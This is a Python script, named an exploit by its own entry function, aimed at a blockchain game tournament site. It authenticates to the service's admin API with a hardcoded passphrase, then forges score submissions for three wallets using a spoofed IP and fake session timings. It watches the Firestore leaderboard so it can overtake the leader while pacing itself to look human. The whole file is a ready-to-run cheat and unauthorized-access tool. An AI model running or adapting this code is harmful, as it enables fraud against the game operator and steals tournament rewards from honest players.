import requests
import urllib3
import json
from datetime import datetime
import base64
import random
import time
import re
from urllib import parse
import operator
import threading

urllib3.disable_warnings()

# ========== Wallets ==========
wallet_spicy_walls = '0x2b17a68573381f12e768e9507f1d6F5361CCA1DF'
wallet_to_the_moon = '0xa94B40e1EB8b87a79510fD15f98c0fb986dcD4f1'
wallet_in_the_woods = '0x5ccd2F57fD869A95AE12e8aE964943e042F1e1EB'
# =============================

# =============== General Functions =================
def play_to_the_moon(wallet):
    game_name = 'To The Moon'
    player = wallet
    play(game_name, player, 3, 12)

def play_spiky_walls(wallet):
    game_name = 'Spiky Walls'
    player = wallet
    play(game_name, player, 3, 10)

def play_in_the_woods(wallet):
    game_name = 'In The Woods'
    player = wallet
    play(game_name, player, 8, 30)

def play(game_name, wallet, start_number, finish_number):
    print('[!] Starting the Game: {} [!]'.format(game_name))
    last_score = 1

    scoreboard = manage_scoreboard(wallet, game_name)

    while(True):
        print('[-] Not Leader [-]')
            
        print('Last Score: ' + str(last_score))

        # Generate a new session time based on the last score number
        session_time = generate_session_time(last_score)
        print('Session Time: ' + str(session_time))
            
        # Get the auth token and send the data
        auth_token = get_auth_token()
        send_data(auth_token, wallet, game_name, last_score, session_time)
            
        # Simulate Back to Menu
        sleep_back_menu = session_time + 7.34
        print('Sleep Menu: {}'.format(sleep_back_menu))
        time.sleep(sleep_back_menu)

        print('\n================================\n')

        # Check if I'm leader
        if(last_score >= scoreboard[0][1]): 
            print("==> You're the Tournament Leader !!!\n")
            print('Last Score: ' + str(last_score))

            # Print the current Scoreboard after being the Leader
            manage_scoreboard(wallet, game_name)

            # Simulate a Break of 1 hour + random minutes
            sleep_stop_playing = 3600 + random.randint(0, 360)
            print('Sleep Stop Playing: {}'.format(sleep_stop_playing))
            time.sleep(sleep_stop_playing)
            
            # Refresh the Score
            scoreboard = manage_scoreboard(wallet, game_name)
        
        else: 
            # Increment the new score in number between start_number-finish_number
            last_score += random.randint(start_number,finish_number)
            continue

def get_auth_token():
    headers = {
        'Host': 'www.manarium.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json',
        'Content-Length': '64',
        'Origin': 'https://www.2themoon.fun',
        'Connection': 'close',
        'Referer': 'https://www.2themoon.fun/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    data = '{"passphrase":"b80b6c13a65f6b22c3b1098abfd0150882cbea6ea993d11"}'

    response = requests.post('https://www.manarium.com/api/adminAuth', headers=headers, data=data, verify=False)

    return json.loads(response.text)['accessToken']

def send_data(auth_token, wallet, game_name, score, session_time):
    data_dict = '{"gameTitle":"' + "{}".format(game_name) + '","wallet":"' + "{}".format(wallet) + '","sessionTime":"' + "{}".format(session_time) + '","timeUTC":"' + "{}".format(str(datetime.utcnow()).split('.')[0]) + '","ip":"177.58.159.123","gameVersion":2,"score":' + str(score) + '}'

    payload = json.dumps({"data": "{}".format(base64.b64encode(data_dict.encode('ascii')).decode('ascii'))})

    headers = {
        'Host': 'www.manarium.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Authorization': 'Bearer {}'.format(auth_token),
        'Content-Type': 'application/json',
        'Content-Length': '259',
        'Origin': 'https://www.2themoon.fun',
        'Connection': 'close',
        'Referer': 'https://www.2themoon.fun/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    response = requests.post('https://www.manarium.com/api/updatePlayerInfo', headers=headers, data=payload, verify=False)
    
    print(response.text)

def generate_session_time(score):
    return (score * 2.03) + random.randint(0,9) + random.random()

# ============== End General Functions =================

# ========== Scoreboard Functions =============
### Generate GSessionID & SID
def one(wallet):
    headers = {
        'Host': 'firestore.googleapis.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '326',
        'Origin': 'https://www.2themoon.fun',
        'Connection': 'close',
        'Referer': 'https://www.2themoon.fun/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('VER', '8'),
        ('RID', '20119'),
        ('CVER', '22'),
        ('X-HTTP-Session-Id', 'gsessionid'),
        ('$httpHeaders', 'X-Goog-Api-Client:gl-js/ fire/7.19.1\r\nContent-Type:text/plain\r\n'),
        ('zx', '6frry4j2muls'),
        ('t', '1'),
    )

    data = 'count=1&ofs=0&req0___data__=%7B%22database%22%3A%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%22%2C%22addTarget%22%3A%7B%22documents%22%3A%7B%22documents%22%3A%5B%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%2Fdocuments%2Fblacklist%2F{}%22%5D%7D%2C%22targetId%22%3A4%7D%7D'.format(wallet)

    response = requests.post('https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel', headers=headers, params=params, data=data, verify=False)

    return [response.headers['X-HTTP-Session-Id'], response.text.split(',')[2].replace('"','')]

# 2º Request after GSessionID SID
def two(gsessionid, sid):
    headers = {
        'Host': 'firestore.googleapis.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '131',
        'Origin': 'https://www.2themoon.fun',
        'Connection': 'close',
        'Referer': 'https://www.2themoon.fun/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('VER', '8'),
        ('gsessionid', gsessionid),
        ('SID', sid),
        ('RID', '20120'),
        ('AID', '0'),
        ('zx', 'g6k0ikykbewq'),
        ('t', '1'),
    )

    data = 'count=1&ofs=1&req0___data__=%7B%22database%22%3A%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%22%2C%22removeTarget%22%3A4%7D'

    response = requests.post('https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel', headers=headers, params=params, data=data, verify=False)

## 3º Request after GSessionID SID
def three(gsessionid, sid, game_name):
    headers = {
        'Host': 'firestore.googleapis.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '475',
        'Origin': 'https://www.2themoon.fun',
        'Connection': 'close',
        'Referer': 'https://www.2themoon.fun/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('VER', '8'),
        ('gsessionid', gsessionid),
        ('SID', sid),
        ('RID', '20121'),
        ('AID', '0'),
        ('zx', 'ekz50g53hhct'),
        ('t', '1'),
    )

    data = 'count=1&ofs=2&req0___data__=%7B%22database%22%3A%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%22%2C%22addTarget%22%3A%7B%22query%22%3A%7B%22structuredQuery%22%3A%7B%22from%22%3A%5B%7B%22collectionId%22%3A%22{}%22%7D%5D%2C%22orderBy%22%3A%5B%7B%22field%22%3A%7B%22fieldPath%22%3A%22__name__%22%7D%2C%22direction%22%3A%22ASCENDING%22%7D%5D%7D%2C%22parent%22%3A%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%2Fdocuments%22%7D%2C%22targetId%22%3A6%7D%7D'.format(game_name.replace(' ', '%20'))

    response = requests.post('https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel', headers=headers, params=params, data=data, verify=False)

## 4º Request after GSessionID SID
def four(gsessionid, sid):
    headers = {
        'Host': 'firestore.googleapis.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '756',
        'Origin': 'https://www.2themoon.fun',
        'Connection': 'close',
        'Referer': 'https://www.2themoon.fun/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('VER', '8'),
        ('gsessionid', gsessionid),
        ('SID', sid),
        ('RID', '20122'),
        ('AID', '0'),
        ('zx', '1m88ocp254aq'),
        ('t', '1'),
    )

    data = 'count=2&ofs=3&req0___data__=%7B%22database%22%3A%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%22%2C%22addTarget%22%3A%7B%22query%22%3A%7B%22structuredQuery%22%3A%7B%22from%22%3A%5B%7B%22collectionId%22%3A%22blacklist%22%7D%5D%2C%22where%22%3A%7B%22fieldFilter%22%3A%7B%22field%22%3A%7B%22fieldPath%22%3A%22ban%22%7D%2C%22op%22%3A%22EQUAL%22%2C%22value%22%3A%7B%22booleanValue%22%3Atrue%7D%7D%7D%2C%22orderBy%22%3A%5B%7B%22field%22%3A%7B%22fieldPath%22%3A%22__name__%22%7D%2C%22direction%22%3A%22ASCENDING%22%7D%5D%7D%2C%22parent%22%3A%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%2Fdocuments%22%7D%2C%22targetId%22%3A8%7D%7D&req1___data__=%7B%22database%22%3A%22projects%2Fplayground-bsc%2Fdatabases%2F(default)%22%2C%22removeTarget%22%3A6%7D'

    response = requests.post('https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel', headers=headers, params=params, data=data, verify=False)

## 5º Request after GSessionID SID (Get Score)
def five(gsessionid, sid):
    headers = {
        'Host': 'firestore.googleapis.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Origin': 'https://www.2themoon.fun',
        'Connection': 'close',
        'Referer': 'https://www.2themoon.fun/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    params = (
        ('database', 'projects/playground-bsc/databases/(default)'),
        ('gsessionid', gsessionid),
        ('VER', '8'),
        ('RID', 'rpc'),
        ('SID', sid),
        ('CI', '0'),
        ('AID', '0'),
        ('TYPE', 'xmlhttp'),
        ('zx', 'uk8dq8kg54n3'),
        ('t', '2'),
    )

    response = requests.get('https://firestore.googleapis.com/google.firestore.v1.Firestore/Listen/channel', headers=headers, params=params, verify=False)

    return response.text

## get the scoreboard and format
def get_score(wallet, game_name):
    gsessionid, sid = one(wallet)
    two(gsessionid, sid)
    three(gsessionid, sid, game_name)
    four(gsessionid, sid)
    raw_score = five(gsessionid, sid)

    formated_score = format_score(raw_score)

    return formated_score

## format the score in format [wallet, score]
def format_score(scoreboard):
    scores = re.findall('\"score\":\{\"integerValue\":\"([0-9]{0,})\"}', scoreboard.replace(' ','').replace('\n',''))
    wallets = re.findall('\{\"stringValue\":\"(0x+[0-9a-zA-Z]{0,})\"\}', scoreboard.replace(' ','').replace('\n',''))

    all_data = []

    for i in range(len(scores)):
        all_data.append([wallets[i], int(scores[i])])
    
    scoreboard = sorted_list = sorted(all_data, key=operator.itemgetter(1), reverse=True)

    return scoreboard

## Get the formated scoreboard and print it
def manage_scoreboard(wallet, game_name):
    print("[-] Getting the {}' Scoreboard, please wait [-]".format(game_name))
    scoreboard = get_score(wallet, game_name)
    print('[+] {}\' Scoreboard [+]\n - {}\n================================================\n'.format(game_name, "\n - ".join(player[0] + ":" + str(player[1]) for player in scoreboard)))
    
    return scoreboard

# ============= End ScoreBoard Functions ============

def exploit():
    thread_spiky_walls = threading.Thread(target=play_spiky_walls, args=(wallet_spicy_walls,))
    thread_to_the_moon = threading.Thread(target=play_to_the_moon, args=(wallet_to_the_moon,))
    thread_in_the_woods = threading.Thread(target=play_in_the_woods, args=(wallet_in_the_woods,))

    thread_spiky_walls.start()
    thread_to_the_moon.start()
    thread_in_the_woods.start()        

if __name__ == '__main__':
    exploit()